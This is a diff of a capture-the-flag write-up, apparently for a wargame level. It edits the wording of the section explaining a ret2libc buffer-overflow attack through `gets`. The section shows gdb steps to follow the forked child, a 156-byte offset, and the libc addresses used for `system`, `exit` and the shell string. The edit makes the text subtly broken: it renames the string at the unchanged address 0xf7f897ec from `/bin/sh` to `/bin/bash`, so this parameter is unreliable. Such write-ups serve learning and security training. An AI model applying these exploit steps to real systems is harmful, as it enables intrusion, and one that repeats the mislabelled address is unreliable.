@@ -11,7 +11,7 @@ child is exiting...
 ## methodology
 - ret2libc attack
 
-Since the <code>gets</code> function is vulnerable to buffer overflow, we use it to perform a ret2libc attack. Calculating the offset is quite tricky, as a child process is created in the <code>main</code> function and there's no way for the segfault to occur because the parent is still waiting. However, there is an easy way to bypass this situation:
+The `gets` function is vulnerable to a buffer overflow, which allows us to perform a ret2libc attack. Calculating the offset is tricky because a child process is created in the `main` function, and there’s no way for a segmentation fault to occur since the parent process is still waiting. However, we can bypass this issue with the following steps:
 ``` shell
 (gdb) set follow-fork-mode child
 (gdb) r
@@ -25,11 +25,11 @@ Program received signal SIGSEGV, Segmentation fault.
 0x41326641 in ?? ()
 ```
 
-Now to the ret2libc:
+Now for the ret2libc:
 1. offset = 156 bytes ([Wiremask](https://wiremask.eu/tools/buffer-overflow-pattern-generator/))
-2. <code>system</code> address = 0xf7e6aed0
-3. <code>exit</code> address = 0xf7e5eb70
-4. <code>/bin/sh</code> address = 0xf7f897ec
+2. address of `system` = 0xf7e6aed0
+3. address of `exit` = 0xf7e5eb70
+4. address of `/bin/bash` = 0xf7f897ec
 
 Our payload is generated using an attached script.
 
